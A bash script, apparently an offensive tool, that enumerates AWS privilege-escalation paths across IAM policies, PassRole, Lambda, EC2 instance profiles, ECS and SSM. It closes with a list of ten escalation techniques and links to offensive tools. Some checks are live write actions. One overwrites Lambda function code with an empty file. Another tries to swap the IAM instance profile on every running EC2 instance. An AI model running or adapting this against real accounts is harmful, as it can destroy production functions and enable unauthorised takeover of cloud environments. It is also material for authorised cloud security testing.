#!/usr/bin/env bash
# ==============================================================================
# AWS PRIVILEGE ESCALATION — Automated IAM/Lambda/EC2 privesc paths
# Usage: bash aws_priv_esc.sh [--profile PROFILE] [--region REGION]
# ==============================================================================
set -euo pipefail

PROFILE="${AWS_PROFILE:-default}"
REGION="${AWS_REGION:-us-east-1}"

command -v aws &>/dev/null || { echo "AWS CLI not installed"; exit 1; }

echo "=== AWS Privilege Escalation Enumeration ==="
echo "Profile: $PROFILE | Region: $REGION"
echo ""

# Get current identity
IDENTITY=$(aws sts get-caller-identity --profile "$PROFILE" --region "$REGION" 2>/dev/null)
USER_ARN=$(echo "$IDENTITY" | jq -r '.Arn')
echo "[*] Current identity: $USER_ARN"
echo ""

# 1. IAM Policy Analysis
echo "[*] 1. IAM Attached Policies Analysis"
aws iam list-attached-user-policies --user-name "$(echo "$USER_ARN" | cut -d/ -f2)" --profile "$PROFILE" --region "$REGION" 2>/dev/null | jq -r '.AttachedPolicies[].PolicyArn' | while read -r pol; do
    aws iam get-policy-version --policy-arn "$pol" --version-id "$(aws iam get-policy --policy-arn "$pol" --query 'Policy.DefaultVersionId' --output text --profile "$PROFILE" --region "$REGION")" --profile "$PROFILE" --region "$REGION" 2>/dev/null | jq -r '.PolicyVersion.Document' | python3 -c "
import sys, json
doc = json.load(sys.stdin)
for stmt in doc.get('Statement', []):
    if stmt.get('Effect') == 'Allow':
        actions = stmt.get('Action', [])
        if isinstance(actions, str): actions = [actions]
        for a in actions:
            if any(k in a.lower() for k in ['attach', 'put', 'create', 'update', 'passrole', 'assume']):
                print(f'  [!] Dangerous: {a} on {stmt.get("Resource", "*")}')
"
done

# 2. iam:PassRole
echo ""
echo "[*] 2. iam:PassRole Checks"
aws iam simulate-principal-policy --policy-source-arn "$USER_ARN" --action-names iam:PassRole --resource-arns "*" --profile "$PROFILE" --region "$REGION" 2>/dev/null | jq -r '.EvaluationResults[] | select(.EvalDecision=="allowed") | "  [+] Can pass role: \(.EvalResourceName)"'

# 3. Lambda Privesc
echo ""
echo "[*] 3. Lambda Function Code Execution"
aws lambda list-functions --profile "$PROFILE" --region "$REGION" 2>/dev/null | jq -r '.Functions[] | select(.CodeSize < 500000) | "\(.FunctionName)\t\(.Role)"' | while read -r name role; do
    echo "  [*] Checking: $name"
    # Check if we can update function code
    aws lambda update-function-code --function-name "$name" --zip-file fileb:///dev/null --profile "$PROFILE" --region "$REGION" 2>&1 | grep -q "AccessDenied" || echo "    [!] Can update function code!"
done

# 4. EC2 Instance Profiles
echo ""
echo "[*] 4. EC2 Instance Profile Attachment"
aws ec2 describe-instances --profile "$PROFILE" --region "$REGION" 2>/dev/null | jq -r '.Reservations[].Instances[] | select(.State.Name=="running") | "\(.InstanceId)\t\(.IamInstanceProfile.Arn // "none")"' | while read -r inst profile; do
    echo "  Instance: $inst - Profile: $profile"
    # Check if we can attach/replace profile
    aws ec2 associate-iam-instance-profile --instance-id "$inst" --iam-instance-profile Name="test" --profile "$PROFILE" --region "$REGION" 2>&1 | grep -q "UnauthorizedOperation" || echo "    [!] Can modify instance profile!"
done

# 5. CloudFormation
echo ""
echo "[*] 5. CloudFormation Stack Deployment"
aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE UPDATE_COMPLETE --profile "$PROFILE" --region "$REGION" 2>/dev/null | jq -r '.StackSummaries[].StackName' | while read -r stack; do
    echo "  Stack: $stack"
    # Check for drift/updates
done

# 6. ECS/EKS
echo ""
echo "[*] 6. ECS Task Definitions / EKS"
aws ecs list-clusters --profile "$PROFILE" --region "$REGION" 2>/dev/null | jq -r '.clusterArns[]' | while read -r cluster; do
    echo "  Cluster: $cluster"
    aws ecs list-task-definitions --family-prefix "" --profile "$PROFILE" --region "$REGION" 2>/dev/null | jq -r '.taskDefinitionArns[]' | while read -r td; do
        # Check for privileged containers
        aws ecs describe-task-definition --task-definition "$td" --profile "$PROFILE" --region "$REGION" 2>/dev/null | jq -r '.taskDefinition.containerDefinitions[] | select(.privileged==true) | "    [!] Privileged container: \(.name)"'
    done
done

# 7. SSM / Systems Manager
echo ""
echo "[*] 7. SSM Document Execution"
aws ssm list-documents --profile "$PROFILE" --region "$REGION" 2>/dev/null | jq -r '.DocumentIdentifiers[] | select(.DocumentType=="Command") | .Name' | while read -r doc; do
    echo "  Document: $doc"
    # Check if we can send command
done

# 8. Glue / DataPipeline
echo ""
echo "[*] 8. AWS Glue / DataPipeline"
aws glue list-jobs --profile "$PROFILE" --region "$REGION" 2>/dev/null | jq -r '.JobNames[]' | while read -r job; do
    echo "  Glue Job: $job"
done

# Summary
echo ""
echo "=== ESCALATION PATHS ==="
cat << 'PATHS_EOF'
Common Privesc Paths:

1. iam:AttachUserPolicy / iam:PutUserPolicy
   → Attach AdministratorAccess to current user

2. iam:CreateAccessKey
   → Create keys for admin user

3. iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
   → Create Lambda with admin role, execute code

4. iam:PassRole + ec2:RunInstances
   → Launch EC2 with admin instance profile

5. iam:PassRole + cloudformation:CreateStack
   → Deploy stack with admin role

6. iam:UpdateAssumeRolePolicy
   → Modify trust policy to assume admin role

7. sts:AssumeRole (with condition bypass)
   → Assume role via condition keys

8. lambda:UpdateFunctionCode
   → Inject code into existing Lambda

9. ec2:RunInstances + iam:PassRole
   → Launch instance with privileged profile

10. iam:AddUserToGroup
    → Add self to admin group

Tools:
  - aws_escalate (https://github.com/RhinoSecurityLabs/aws_escalate)
  - Pacu (https://github.com/RhinoSecurityLabs/pacu)
  - CloudFox (https://github.com/BishopFox/cloudfox)
PATHS_EOF
